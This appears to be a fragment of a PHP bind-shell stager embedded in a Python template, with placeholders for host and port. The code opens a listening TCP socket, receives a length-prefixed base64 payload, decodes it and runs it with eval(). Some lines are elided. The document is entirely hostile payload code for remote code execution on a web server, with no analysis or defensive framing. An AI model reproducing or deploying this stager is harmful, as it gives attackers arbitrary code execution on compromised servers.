...
$h='{self.rhost}';
$p={self.rport};
$s=@stream_socket_server('tcp://'.$h.':'.$p,$e);
if(!$s && function_exists('socket_create')){{
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  if($s){{@socket_set_option($s,SOL_SOCKET,SO_REUSEADDR,1);@socket_bind($s,$h,$p);@socket_listen($s,1);}}
}}
if($s){{
  ...
  if(strlen($l)===4){{
    ...
    $n=$u['len'];
    $d='';
    while(strlen($d)<$n && !feof($c)){{$ch=fread($c,min(8192,$n-strlen($d)));if($ch===false||$ch===''){{break;}}$d.=$ch;}}
    if(strlen($d)===$n){{
      $code=base64_decode($d);
      if($code!==false){{$s=$c;eval($code);}}
    }}
  }}
  @fclose($c);
  }}
